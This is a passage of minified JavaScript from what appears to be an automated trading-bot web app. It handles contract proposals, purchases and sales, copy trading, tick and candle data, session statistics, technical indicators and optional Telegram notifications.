                                askPrice: n.ask_price
                            }
                        }
                        selectProposalVH(e) {
                            let {
                                vh_proposals: t
                            } = this.data;
                            if (0 === t.length) throw Error((0, y.NC)("Virtual Hook Proposals are not ready"));
                            let n = t.find(t => {
                                if (t.contract_type === e) {
                                    if (t.error) throw t.error;
                                    return t
                                }
                                return !1
                            });
                            if (!n) throw Error((0, y.NC)("Selected proposal does not exist"));
                            return {
                                id: n.id,
                                askPrice: n.ask_price
                            }
                        }
                        renewProposalsOnPurchase() {
                            this.data.proposals = [], this.store.dispatch(X()), this.requestProposals()
                        }
                        renewProposalsOnPurchaseVH() {
                            this.data.vh_proposals = [], this.store.dispatch(X()), this.requestProposalsVH()
                        }
                        requestProposals() {
                            let e = !1;
                            Promise.all(this.proposal_templates.map(t => {
                                (0, g.l6)(() => d.DO.api.send(t)).catch(t => "ContractBuyValidationError" === t.error.code ? (this.data.proposals.push({ ...t.error.echo_req,
                                    ...t.echo_req.passthrough,
                                    error: t
                                }), null) : (!e && (e = !0, this.$scope.observer.emit("Error", t.error)), null))
                            }))
                        }
                        requestProposalsVH() {
                            let e = !1;
                            Promise.all(this.vhProposalTemplates.map(t => {
                                (0, g.l6)(() => d.PL.api.send(t)).catch(t => "ContractBuyValidationError" === t.error.code ? (this.data.vh_proposals.push({ ...t.error.echo_req,
                                    ...t.echo_req.passthrough,
                                    error: t
                                }), null) : (!e && (e = !0, this.$scope.observer.emit("Error", t.error)), null))
                            }))
                        }
                        observeProposals() {
                            if (!d.DO.api) return;
                            let e = d.DO.api.onMessage().subscribe(e => {
                                if ("proposal" === e.data.msg_type) {
                                    let {
                                        passthrough: t,
                                        proposal: n
                                    } = e.data;
                                    n && -1 === this.data.proposals.findIndex(e => e.id === n.id) && (this.data.proposals.push({ ...n,
                                        ...t
                                    }), this.checkProposalReady())
                                }
                            });
                            d.DO.pushSubscription(e)
                        }
                        observeProposalsVH() {
                            if (!d.PL.api) return;
                            let e = d.PL.api.onMessage().subscribe(e => {
                                if ("proposal" === e.data.msg_type) {
                                    let {
                                        passthrough: t,
                                        proposal: n
                                    } = e.data;
                                    n && -1 === this.data.vh_proposals.findIndex(e => e.id === n.id) && (this.data.vh_proposals.push({ ...n,
                                        ...t
                                    }), this.checkProposalReadyVH())
                                }
                            });
                            d.PL.pushSubscription(e)
                        }
                        checkProposalReady() {
                            let {
                                proposals: e
                            } = this.data;
                            e.length > 0 && this.proposal_templates && this.proposal_templates.every(t => -1 !== e.findIndex(e => e.purchase_reference === t.passthrough.purchase_reference && e.contract_type === t.contract_type)) && this.startPromise.then(() => this.store.dispatch(G()))
                        }
                        checkProposalReadyVH() {
                            let {
                                vh_proposals: e
                            } = this.data;
                            e.length > 0 && this.proposal_templates && this.proposal_templates.every(t => -1 !== e.findIndex(e => e.purchase_reference === t.passthrough.purchase_reference && e.contract_type === t.contract_type)) && this.startPromise.then(() => this.store.dispatch(G()))
                        }
                        isNewTradeOption(e) {
                            return this.trade_option ? ["amount", "barrierOffset", "basis", "duration", "duration_unit", "prediction", "secondBarrierOffset", "symbol"].some(t => this.trade_option[t] !== e[t]) : (this.trade_option = e, !0)
                        }
                    };
                var ec = n("87383");
                let eu = 0,
                    em = e => class t extends e {
                        purchase(e) {
                            if (this.store.getState().scope !== O) return Promise.resolve();
                            let t = t => {
                                    let {
                                        buy: n
                                    } = t, {
                                        buy_contract_for_multiple_accounts: a
                                    } = t;
                                    a && (n = a.result[0]), (0, Q.x_)({
                                        id: "contract.purchase_received",
                                        data: n.transaction_id,
                                        buy: n
                                    }), this.contractId = n.contract_id, this.store.dispatch($()), this.is_proposal_subscription_required && (l ? this.renewProposalsOnPurchaseVH() : this.renewProposalsOnPurchase()), eu = 0, (0, Q.cM)(f.v9.PURCHASE, {
                                        longcode: n.longcode,
                                        transaction_id: n.transaction_id
                                    }), (0, Q.um)({
                                        accountID: this.accountInfo.loginid,
                                        totalRuns: this.updateAndReturnTotalRuns(),
                                        transaction_ids: {
                                            buy: n.transaction_id
                                        },
                                        contract_type: e,
                                        buy_price: n.buy_price
                                    })
                                },
                                n = localStorage.getItem(`${d.DO.account_id}_tokens`);
                            n = JSON.parse(n);
                            let a = r.GL.copy_trading.is_active,
                                i = r.GL.demo_copy_trading.is_active,
                                l = r.GL.vh_variables.is_enabled;
                            if (this.is_proposal_subscription_required) {
                                let {
                                    id: o,
                                    askPrice: s
                                } = l ? this.selectProposalVH(e) : this.selectProposal(e), c = () => l ? d.PL.api.send({
                                    buy: o,
                                    price: s
                                }) : a ? d.DO.api.send({
                                    buy_contract_for_multiple_accounts: o,
                                    price: s,
                                    tokens: [(0, ec.LP)().token, ...n]
                                }) : i ? d.DO.api.send({
                                    buy_contract_for_multiple_accounts: o,
                                    price: s,
                                    tokens: [(0, ec.LP)().token, (0, ec.Lu)(r.GL.demo_copy_trading.login_id).token]
                                }) : d.DO.api.send({
                                    buy: o,
                                    price: s
                                });
                                return (this.isSold = !1, (0, Q.x_)({
                                    id: "contract.purchase_sent",
                                    data: s
                                }), this.options.timeMachineEnabled) ? (0, g.Kn)(c, (e, t) => {
                                    "DisconnectError" !== e ? l ? this.renewProposalsOnPurchaseVH() : this.renewProposalsOnPurchase() : this.clearProposals();
                                    let n = this.store.subscribe(() => {
                                        let {
                                            scope: e,
                                            proposalsReady: a
                                        } = this.store.getState();
                                        e === O && a && (t().then(() => this.observer.emit("REVERT", "before")), n())
                                    })
                                }, ["PriceMoved", "InvalidContractProposal"], eu++).then(t) : (0, g.l6)(c).then(t)
                            }
                            let o = r.GL.contract_switcher.contract_switcher_value,
                                s = "disable" === o ? e : o,
                                c = (0, g.nD)(s, this.tradeOptions),
                                u = () => l ? d.PL.api.send(c) : d.DO.api.send(c);
                            return (this.isSold = !1, (0, Q.x_)({
                                id: "contract.purchase_sent",
                                data: this.tradeOptions.amount
                            }), this.options.timeMachineEnabled) ? (0, g.Kn)(u, (e, t) => {
                                "DisconnectError" === e && this.clearProposals();
                                let n = this.store.subscribe(() => {
                                    let {
                                        scope: e
                                    } = this.store.getState();
                                    e === O && (t().then(() => this.observer.emit("REVERT", "before")), n())
                                })
                            }, ["PriceMoved", "InvalidContractProposal"], eu++).then(t) : (0, g.l6)(u).then(t)
                        }
                        constructor(...e) {
                            super(...e), (0, o._)(this, "getPurchaseReference", () => a), (0, o._)(this, "regeneratePurchaseReference", () => {
                                a = (0, g.Fs)()
                            })
                        }
                    },
                    eb = e => class t extends e {
                        isSellAtMarketAvailable() {
                            return this.contractId && !this.isSold && this.isSellAvailable && !this.isExpired
                        }
                        sellAtMarket() {
                            if (_.P.emit("bot.sell"), this.store.getState().scope !== L) return Promise.resolve();
                            if (!this.isSellAtMarketAvailable()) return (0, Q.cM)(f.v9.NOT_OFFERED), Promise.resolve();
                            let e = 1;
                            return new Promise(t => {
                                let n = n => {
                                        if (e = 1, n) {
                                            let {
                                                sold_for: e
                                            } = n.sell;
                                            (0, Q.cM)(f.v9.SELL, {
                                                sold_for: e
                                            })
                                        }(0, Q.x_)("purchase.sold"), this.waitForAfter(), t()
                                    },
                                    a = this.contractId,
                                    i = () => (0, g.l6)(() => d.DO.api.send({
                                        sell: a,
                                        price: 0
                                    })).then(e => {
                                        (0, g.l6)(() => d.DO.api.send({
                                            proposal_open_contract: 1,
                                            contract_id: a
                                        })).then(() => e)
                                    }).catch(e => {
                                        let t = e.error;
                                        if ("InvalidOfferings" === t.code) return Promise.resolve();
                                        let n = {
                                            name: t.code,
                                            message: t.message,
                                            msg_type: e.msg_type,
                                            error: { ...t.error
                                            }
                                        };
                                        return "RateLimit" === t.code ? Promise.reject(n) : (0, g.l6)(() => d.DO.api.send({
                                            proposal_open_contract: 1,
                                            contract_id: a
                                        })).then(e => {
                                            let {
                                                proposal_open_contract: t
                                            } = e;
                                            return t.is_sold ? Promise.resolve({
                                                sell: {
                                                    sold_for: t.sell_price
                                                }
                                            }) : Promise.reject(n)
                                        })
                                    }),
                                    l = ["NoOpenPosition", "InvalidSellContractProposal", "UnrecognisedRequest"];
                                return this.options.timeMachineEnabled ? (0, g.Kn)(i, (e, t) => t().then(() => this.observer.emit("REVERT", "during")), l, e++).then(e => n(e)) : (0, g.l6)(i, l).then(e => n(e)).catch(e => e)
                            })
                        }
                    };
                var ep = n("91296"),
                    ef = n.n(ep);
                let e_ = e => e && (0 === e.length ? void 0 : e[e.length - 1]),
                    eh = e => e.times.map((t, n) => ({
                        epoch: +t,
                        quote: +e.prices[n]
                    })),
                    ev = e => class t extends e {
                        async watchTicks(e) {
                            if (e && this.symbol !== e) {
                                this.symbol = e;
                                let {
                                    ticksService: t
                                } = this.$scope;
                                await t.stopMonitor({
                                    symbol: e,
                                    key: i
                                });
                                i = await t.monitor({
                                    symbol: e,
                                    callback: e => {
                                        this.is_proposal_subscription_required && this.checkProposalReady();
                                        let {
                                            epoch: t
                                        } = e.slice(-1)[0];
                                        this.store.dispatch({
                                            type: B,
                                            payload: t
                                        })
                                    }
                                })
                            }
                        }
                        checkTicksPromiseExists() {
                            return this.$scope.ticksService.ticks_history_promise
                        }
                        getTicks() {
                            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                            return new Promise(t => {
                                this.$scope.ticksService.request({
                                    symbol: this.symbol
                                }).then(n => {
                                    t(n.map(t => e ? t.quote.toFixed(this.getPipSize()) : t.quote))
                                })
                            })
                        }
                        getLastTick(e) {
                            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                            return new Promise(n => this.$scope.ticksService.request({
                                symbol: this.symbol
                            }).then(a => {
                                let i = e ? e_(a) : e_(a).quote;
                                !e && t && (i = i.toFixed(this.getPipSize())), n(i)
                            }).catch(e => {
                                "MarketIsClosed" === e.code && (_.P.emit("Error", e), n(e.code))
                            }))
                        }
                        getLastDigit() {
                            return new Promise(e => this.getLastTick(!1, !0).then(t => e((0, g.VM)(t))))
                        }
                        getLastDigitList() {
                            return new Promise(e => this.getTicks().then(t => e(this.getLastDigitsFromList(t))))
                        }
                        getLastDigitsFromList(e) {
                            return e.map(e => (0, g.VM)(e.toFixed(this.getPipSize())))
                        }
                        checkDirection(e) {
                            return new Promise(t => this.$scope.ticksService.request({
                                symbol: this.symbol
                            }).then(n => t((0, g.Mg)(n) === e)))
                        }
                        getOhlc(e) {
                            let {
                                granularity: t = this.options.candleInterval || 60,
                                field: n
                            } = e || {};
                            return new Promise(e => this.$scope.ticksService.request({
                                symbol: this.symbol,
                                granularity: t
                            }).then(t => e(n ? t.map(e => e[n]) : t)))
                        }
                        getOhlcFromEnd(e) {
                            let {
                                index: t = 1
                            } = e || {}, n = A(Number(t), (0, y.NC)("Index must be a positive integer"));
                            return new Promise(t => this.getOhlc(e).then(e => t(e.slice(-n)[0])))
                        }
                        getPipSize() {
                            return this.$scope.ticksService.pipSizes[this.symbol]
                        }
                        async requestAccumulatorStats() {
                            var e, t, n, a, i, l;
                            let o = this.subscription_id_for_accumulators,
                                s = this.is_proposal_requested_for_accumulators,
                                r = { ...window.Blockly.accumulators_request,
                                    amount: null === this || void 0 === this ? void 0 : null === (e = this.tradeOptions) || void 0 === e ? void 0 : e.amount,
                                    basis: null === this || void 0 === this ? void 0 : null === (t = this.tradeOptions) || void 0 === t ? void 0 : t.basis,
                                    contract_type: "ACCU",
                                    currency: null === this || void 0 === this ? void 0 : null === (n = this.tradeOptions) || void 0 === n ? void 0 : n.currency,
                                    growth_rate: null === this || void 0 === this ? void 0 : null === (a = this.tradeOptions) || void 0 === a ? void 0 : a.growth_rate,
                                    proposal: 1,
                                    subscribe: 1,
                                    symbol: null === this || void 0 === this ? void 0 : null === (i = this.tradeOptions) || void 0 === i ? void 0 : i.symbol
                                };
                            !o && !s && (this.is_proposal_requested_for_accumulators = !0, r && await (null === d.DO || void 0 === d.DO ? void 0 : null === (l = d.DO.api) || void 0 === l ? void 0 : l.send(r)))
                        }
                        async handleOnMessageForAccumulators() {
                            let e = [];
                            return new Promise(t => {
                                let n = d.DO.api.onMessage().subscribe(n => {
                                    let {
                                        data: a
                                    } = n;
                                    if ("proposal" === a.msg_type) try {
                                        this.subscription_id_for_accumulators = a.subscription.id, (e = [...(a.proposal.contract_details.ticks_stayed_in || []).flat().reverse(), ...e]).length > 0 && t(e)
                                    } catch (e) {
                                        _.P.emit("Unexpected message type or no proposal found:", e)
                                    }
                                });
                                d.DO.pushSubscription(n)
                            })
                        }
                        async fetchStatsForAccumulators() {
                            try {
                                return ef()(() => this.requestAccumulatorStats(), 300)(), await this.handleOnMessageForAccumulators()
                            } catch (e) {
                                throw _.P.emit("Error in subscription promise:", e), e
                            } finally {
                                var e;
                                await (null === d.DO || void 0 === d.DO ? void 0 : null === (e = d.DO.api) || void 0 === e ? void 0 : e.send({
                                    forget_all: "proposal"
                                })), this.is_proposal_requested_for_accumulators = !1, this.subscription_id_for_accumulators = null
                            }
                        }
                        async getCurrentStat() {
                            try {
                                let e = await this.fetchStatsForAccumulators();
                                return null == e ? void 0 : e[0]
                            } catch (e) {
                                _.P.emit("Error fetching current stat:", e)
                            }
                        }
                        async getStatList() {
                            try {
                                let e = await this.fetchStatsForAccumulators();
                                return null == e ? void 0 : e.slice(0, 100)
                            } catch (e) {
                                _.P.emit("Error fetching current stat:", e)
                            }
                        }
                        async getDelayTickValue(e) {
                            return new Promise((t, n) => {
                                try {
                                    let n = [],
                                        a = this.symbol,
                                        i = () => {
                                            this.$scope.ticksService.stopMonitor({
                                                symbol: a,
                                                key: ""
                                            }), t(n), n.length = 0
                                        },
                                        l = t => {
                                            n.push(t), n.length === e && i()
                                        };
                                    0 >= Number(e) && i(), this.$scope.ticksService.monitor({
                                        symbol: a,
                                        callback: e => l(e)
                                    })
                                } catch (e) {
                                    n(Error(`Failed to start tick monitoring: ${e.message}`))
                                }
                            })
                        }
                    },
                    ey = {
                        totalProfit: 0,
                        totalWins: 0,
                        totalLosses: 0,
                        totalStake: 0,
                        totalPayout: 0,
                        totalRuns: 0
                    },
                    ek = {},
                    eg = e => class t extends e {
                        clearStatistics() {
                            if (this.sessionRuns = 0, this.sessionProfit = 0, !this.accountInfo) return;
                            let {
                                loginid: e
                            } = this.accountInfo;
                            ek[e] = { ...ey
                            }
                        }
                        updateTotals(e) {
                            let {
                                sell_price: t,
                                buy_price: n,
                                currency: a
                            } = e;
                            if (r.GL.vh_variables.is_enabled) return;
                            let i = (0, u.bfN)(Number(t) - Number(n), a),
                                l = i > 0,
                                o = this.getAccountStat();
                            if (o.totalWins += l ? 1 : 0, o.totalLosses += l ? 0 : 1, this.sessionProfit = (0, u.bfN)(Number(this.sessionProfit) + Number(i), a), o.totalProfit = (0, u.bfN)(Number(o.totalProfit) + Number(i), a), o.totalStake = (0, u.bfN)(Number(o.totalStake) + Number(n), a), o.totalPayout = (0, u.bfN)(Number(o.totalPayout) + Number(t), a), r.GL.vh_variables.vh_official) {
                                if (l) r.GL.vh_variables.is_enabled ? ea(parseFloat(o.totalProfit)) : eo(parseFloat(o.totalProfit));
                                else if (r.GL.vh_variables.is_enabled) ei(parseFloat(o.totalProfit));
                                else {
                                    let e = d.DO.is_running,
                                        t = d.PL.is_running;
                                    (e || t) && es(i, parseFloat(o.totalProfit))
                                }
                            }(0, Q.um)({
                                profit: i,
                                contract: e,
                                accountID: this.accountInfo.loginid,
                                totalProfit: o.totalProfit,
                                totalWins: o.totalWins,
                                totalLosses: o.totalLosses,
                                totalStake: o.totalStake,
                                totalPayout: o.totalPayout
                            }), (0, Q.cM)(l ? f.v9.PROFIT : f.v9.LOST, {
                                currency: a,
                                profit: i
                            })
                        }
                        updateAndReturnTotalRuns() {
                            this.sessionRuns++;
                            let e = this.getAccountStat();
                            return ++e.totalRuns
                        }
                        getTotalRuns() {
                            return this.getAccountStat().totalRuns
                        }
                        getTotalWins() {
                            return this.getAccountStat().totalWins
                        }
                        getTotalLosts() {
                            return this.getAccountStat().totalLosses
                        }
                        getTotalProfit(e, t) {
                            let n = this.getAccountStat();
                            return e && 0 !== n.totalProfit ? (0, u.bfN)(+n.totalProfit, t) : +n.totalProfit
                        }
                        checkLimits(e) {
                            if (!e.limitations) return;
                            let {
                                limitations: {
                                    maxLoss: t,
                                    maxTrades: n
                                }
                            } = e;
                            if (t && n) {
                                if (this.sessionRuns >= n) throw (0, k.T)("CustomLimitsReached", (0, y.NC)("Maximum number of trades reached"));
                                if (this.sessionProfit <= -t) throw (0, k.T)("CustomLimitsReached", (0, y.NC)("Maximum loss amount reached"))
                            }
                        }
                        validateTradeOptions(e) {
                            let t = e.take_profit,
                                n = e.stop_loss;
                            return t && (e.limit_order.take_profit = t), n && (e.limit_order.stop_loss = n), e
                        }
                        getAccountStat() {
                            this.accountInfo = d.DO.account_info;
                            let {
                                loginid: e
                            } = this.accountInfo;
                            return !(e in ek) && (ek[e] = { ...ey
                            }), ek[e]
                        }
                        constructor() {
                            super(), this.sessionRuns = 0, this.sessionProfit = 0, _.P.register("statistics.clear", this.clearStatistics.bind(this))
                        }
                    },
                    eT = e => eA({
                        store: e,
                        stopScope: L,
                        passScope: O,
                        passFlag: "proposalsReady"
                    }),
                    eE = e => eA({
                        store: e,
                        stopScope: M,
                        passScope: L,
                        passFlag: "openContract"
                    }),
                    eA = e => {
                        let {
                            store: t,
                            stopScope: n,
                            passScope: a,
                            passFlag: i
                        } = e;
                        return t.getState().scope === n ? Promise.resolve(!1) : new Promise(e => {
                            let o = t.subscribe(() => {
                                let s = t.getState();
                                s.newTick !== l && (l = s.newTick, s.scope === a && s[i] && (o(), e(!0)), s.scope === n && (o(), e(!1)))
                            })
                        })
                    };
                class ex extends ee(em(eb(er(ed(ev(eg(class {}))))))) {
                    init() {
                        for (var e = arguments.length, t = Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                        let [a, i] = w(t), {
                            symbol: l
                        } = i;
                        this.initArgs = t, this.options = i, this.startPromise = this.loginAndGetBalance(a), !this.checkTicksPromiseExists() && this.watchTicks(l)
                    }
                    start(e) {
                        if (!this.options) throw (0, k.T)("NotInitialized", (0, y.NC)("Bot.init is not called"));
                        _.P.emit("bot.running");
                        let t = this.validateTradeOptions(e);
                        this.tradeOptions = { ...t,
                            symbol: this.options.symbol
                        }, this.store.dispatch(j()), this.checkLimits(t), this.makeDirectPurchaseDecision()
                    }
                    loginAndGetBalance(e) {
                        return this.token === e ? Promise.resolve() : (this.accountInfo = d.DO.account_info, this.token = d.DO.token, new Promise(e => {
                            let t = d.DO.api.onMessage().subscribe(t => {
                                let {
                                    data: n
                                } = t;
                                "transaction" === n.msg_type && "sell" === n.transaction.action && (this.transaction_recovery_timeout = setTimeout(() => {
                                    let {
                                        contract: e
                                    } = this.data, t = e.contract_id === n.transaction.contract_id, a = "open" === e.status;
                                    t && a && (0, g.l6)(() => {
                                        d.DO.api.send({
                                            proposal_open_contract: 1,
                                            contract_id: e.contract_id
                                        })
                                    }, ["PriceMoved"])
                                }, 1500)), e()
                            });
                            d.DO.pushSubscription(t)
                        }))
                    }
                    observe() {
                        this.observeOpenContract(), this.observeOpenContractVH(), this.observeBalance(), this.observeProposals(), this.observeProposalsVH()
                    }
                    watch(e) {
                        return "before" === e ? eT(this.store) : eE(this.store)
                    }
                    makeDirectPurchaseDecision() {
                        let {
                            has_payout_block: e,
                            is_basis_payout: t
                        } = (0, g.vo)();
                        this.is_proposal_subscription_required = e || t, this.is_proposal_subscription_required ? (this.makeProposals({ ...this.options,
                            ...this.tradeOptions
                        }), this.checkProposalReady(), this.checkProposalReadyVH()) : this.store.dispatch(G())
                    }
                    constructor(e) {
                        super(), this.observer = e.observer, this.$scope = e, this.observe(), this.data = {
                            contract: {},
                            vh_contract: {},
                            proposals: [],
                            vh_proposals: [],
                            subscribed_contracts: []
                        }, this.subscription_id_for_accumulators = null, this.is_proposal_requested_for_accumulators = !1, this.store = (0, h.MT)(K, (0, h.md)(v.I))
                    }
                }
                let ew = (e, t) => t.data.proposals.find(n => n.contract_type === e && n.purchase_reference === t.getPurchaseReference()),
                    eN = e => e.getSellPrice(),
                    eS = e => {
                        let t = t => (0, g.mh)(e.data.contract)[t];
                        return {
                            init: function() {
                                for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                                return e.init(...n)
                            },
                            start: function() {
                                for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                                return e.start(...n)
                            },
                            stop: function() {
                                for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                                return e.stop(...n)
                            },
                            purchase: t => e.purchase(t),
                            getAskPrice: t => Number(ew(t, e).ask_price),
                            getPayout: t => Number(ew(t, e).payout),
                            getPurchaseReference: () => e.getPurchaseReference(),
                            isSellAvailable: () => e.isSellAtMarketAvailable(),
                            sellAtMarket: () => e.sellAtMarket(),
                            getSellPrice: () => eN(e),
                            isResult: e => t(10) === e,
                            isTradeAgain: e => _.P.emit("bot.trade_again", e),
                            readDetails: e => t(e - 1),
                            enabaleVH: e => {
                                "enable" == e ? s.GL.vh_variables.is_enabled = !0 : s.GL.vh_variables.is_enabled = !1
                            },
                            enabaleTotalLost: e => {
                                "enable" == e ? s.GL.vh_variables.enable_total_lost = !0 : s.GL.vh_variables.enable_total_lost = !1
                            },
                            enabaleDemoCopyTrading: e => {
                                let t = JSON.parse(e);
                                "enable" == t.copy_status ? (s.GL.demo_copy_trading.is_active = !0, s.GL.demo_copy_trading.login_id = t.account_id) : (s.GL.demo_copy_trading.login_id = "", s.GL.demo_copy_trading.is_active = !1)
                            },
                            getVHStatus: () => s.GL.vh_variables.is_enabled,
                            enableBarrierChanger: e => {
                                "enable" == e ? s.GL.touch_notouch_vars.barrier_offset_active = !0 : s.GL.touch_notouch_vars.barrier_offset_active = !1
                            },
                            contractSwitcher: e => {
                                s.GL.contract_switcher.contract_switcher_value = e
                            },
                            predictionSetter: e => {
                                s.GL.pred_setter.allow_pred_setter = !0, s.GL.pred_setter.prediction = e
                            },
                            updateBarrierOffseter: e => {
                                let t = e.replace(/^'|"|'$/g, "");
                                s.GL.touch_notouch_vars.barrier_offset = t
                            },
                            showTP: () => {
                                s.GL.show_notifications.show_tp = !0
                            },
                            showSL: () => {
                                s.GL.show_notifications.show_sl = !0
                            },
                            setActiveContractType: e => {
                                "disable" == e ? (s.GL.other_symbol.isActive = !1, s.GL.other_symbol.symbol = "") : (s.GL.other_symbol.isActive = !0, s.GL.other_symbol.symbol = e)
                            }
                        }
                    },
                    eC = e => ({
                        getDelayTickValue: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.getDelayTickValue(...n)
                        },
                        getCurrentStat: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.getCurrentStat(...n)
                        },
                        getStatList: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.getStatList(...n)
                        },
                        getLastTick: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.getLastTick(...n)
                        },
                        getLastDigit: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.getLastDigit(...n)
                        },
                        getTicks: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.getTicks(...n)
                        },
                        checkDirection: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.checkDirection(...n)
                        },
                        getOhlcFromEnd: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.getOhlcFromEnd(...n)
                        },
                        getOhlc: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.getOhlc(...n)
                        },
                        getLastDigitList: function() {
                            for (var t = arguments.length, n = Array(t), a = 0; a < t; a++) n[a] = arguments[a];
                            return e.getLastDigitList(...n)
                        }
                    }),
                    eO = () => ({
                        isCandleBlack: e => S(e) && e.close < e.open,
                        candleValues: (e, t) => C(e).map(e => e[t]),
                        candleField: (e, t) => S(e)[t]
                    }),
                    eL = (e, t) => e.map(e => t ? e[t] : e),
                    eR = (e, t, n) => eL(e.slice(t > e.length ? 0 : e.length - t, e.length), n),
                    eI = e => e.reduce((e, t) => e + t, 0),
                    eD = e => e.reduce((e, t) => e + t, 0) / e.length,
                    eU = e => {
                        let t = eD(e);
                        return Math.sqrt(eD(e.map(e => (e - t) ** 2)))
                    },
                    eP = (e, t) => {
                        let {
                            periods: n,
                            field: a
                        } = t;
                        if (e.length < n) throw Error("Periods longer than data length");
                        return eI(eR(e, n, a)) / n
                    },
                    eV = (e, t) => {
                        let {
                            periods: n,
                            pipSize: a = 2
                        } = t;
                        return (0, u.vPG)(e.length - n + 1).map((i, l) => +eP(e.slice(l, l + n), t).toFixed(a))
                    },
                    eM = (e, t) => {
                        let {
                            periods: n = 20,
                            field: a,
                            stdDevUp: i = 2,
                            stdDevDown: l = 2,
                            pipSize: o = 2
                        } = t, s = eR(e, n, a), r = eP(s, {
                            periods: n
                        }), d = eU(s), c = r + d * i, u = r - d * l;
                        return [+r.toFixed(o), +c.toFixed(o), +u.toFixed(o)]
                    },
                    eB = (e, t) => {
                        let {
                            periods: n
                        } = t;
                        return (0, u.vPG)(e.length - n + 1).map((a, i) => eM(e.slice(i, i + n), t))
                    },
                    eF = (e, t, n) => {
                        let {
                            periods: a,
                            field: i,
                            pipSize: l = 2
                        } = t, o = 2 / (a + 1), s = eL(e, i);
                        if (n) return (s[0] - n) * o + n;
                        if (e.length < a) throw Error("Periods longer than data length");
                        let r = eD(eL(e.slice(0, a), i));
                        return +s.slice(a).reduce((e, t) => (t - e) * o + e, r).toFixed(l)
                    },
                    ej = (e, t) => {
                        let {
                            periods: n
                        } = t, a = eF(e.slice(0, n), t);
                        return e.slice(n - 1).map((e, n) => n ? a = eF([e], t, a) : a)
                    },
                    eG = (e, t) => {
                        let n = [];
                        return n.length = t - e.length, n.fill(0), [...n, ...e]
                    },
                    eX = (e, t) => {
                        let {
                            field: n,
                            fastEmaPeriod: a = 12,
                            slowEmaPeriod: i = 26,
                            signalEmaPeriod: l = 9,
                            pipSize: o = 2
                        } = t, s = eL(e, n), r = s.length, d = eG(ej(s, {
                            periods: a,
                            pipSize: 20,
                            field: n
                        }), r), c = eG(ej(s, {
                            periods: i,
                            pipSize: 20,
                            field: n
                        }), r), u = eG(c.map((e, t) => +(d[t] - e).toFixed(o)), r), m = eG(ej(u.slice(i - 1), {
                            periods: l,
                            pipSize: 20,
                            field: n
                        }), r);
                        return u.map((e, t) => [+(e - m[t]).toFixed(o), e, +m[t].toFixed(o)]).slice(i + l - 2)
                    },
                    eY = (e, t) => t > e ? t - e : 0,
                    eH = (e, t) => t < e ? e - t : 0,
                    e$ = (e, t, n) => {
                        let a;
                        return e.reduce((e, n, i) => {
                            1 === i && (a = e);
                            let l = t(a, n);
                            return a = n, l + (1 === i ? 0 : e)
                        }) / n
                    },
                    eW = (e, t, n, a) => {
                        let i;
                        return 1 === e.length ? a : e.reduce((e, l, o) => {
                            1 === o && (i = e);
                            let s = t(i, l);
                            return i = l, ((1 === o ? a : e) * (n - 1) + s) / n
                        })
                    },
                    ez = (e, t, n) => {
                        let a, i, l;
                        let {
                            periods: o,
                            field: s
                        } = t;
                        if (e.length < o) throw Error("Periods longer than data length");
                        if (e.length === o) return 0;
                        let r = eL(e.slice(0, o + 1), s);
                        n && "gain" in n ? (a = eL(e.slice(-2), s), i = n.gain, l = n.loss) : (a = eL(e.slice(o, e.length), s), i = e$(r, eY, o), l = e$(r, eH, o));
                        let d = eW(a, eY, o, i),
                            c = eW(a, eH, o, l);
                        return (n && (n.gain = d, n.loss = c), 0 === d) ? 0 : 0 === c ? 100 : 100 - 100 / (1 + d / c)
                    },
                    eZ = (e, t) => {
                        let {
                            periods: n,
                            pipSize: a = 2
                        } = t, i = {};
                        return (0, u.vPG)(e.length - n).map((l, o) => +ez(e.slice(0, o + n + 1), t, i).toFixed(a))
                    },
                    eK = function(e, t, n, a) {
                        for (var i = arguments.length, l = Array(i > 4 ? i - 4 : 0), o = 4; o < i; o++) l[o - 4] = arguments[o];
                        return e(t, {
                            pipSize: n.getPipSize(),
                            ...a
                        }, ...l)
                    },
                    eq = e => ({
                        sma: (t, n) => eK(eP, t, e, {
                            periods: n
                        }),
                        smaa: (t, n) => eK(eV, t, e, {
                            periods: n
                        }),
                        ema: (t, n) => eK(eF, t, e, {
                            periods: n
                        }),
                        emaa: (t, n) => eK(ej, t, e, {
                            periods: n
                        }),
                        rsi: (t, n) => eK(ez, t, e, {
                            periods: n
                        }),
                        rsia: (t, n) => eK(eZ, t, e, {
                            periods: n
                        }),
                        bb: (t, n, a) => eK(eM, t, e, n)[a],
                        bba: (t, n, a) => eK(eB, t, e, n).map(e => e[a]),
                        macda: (t, n, a) => eK(eX, t, e, n).map(e => e[a])
                    }),
                    eQ = e => ({
                        notify: e => _.P.emit("ui.log.notify", e),
                        console: e => {
                            let {
                                type: t,
                                message: n
                            } = e;
                            return console[t](n)
                        },
                        notifyTelegram: (e, t, n) => {
                            let a = () => (0, Q.h4)("warn", (0, y.NC)("The Telegram notification could not be sent"));
                            fetch(`https://api.telegram.org/bot${e}/sendMessage`, {
                                method: "POST",
                                mode: "cors",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    chat_id: t,
                                    text: n
                                })
                            }).then(e => {
                                !e.ok && a()
                            }).catch(a)
                        },
                        getTotalRuns: () => e.getTotalRuns(),
                        getBalance: t => e.getBalance(t),
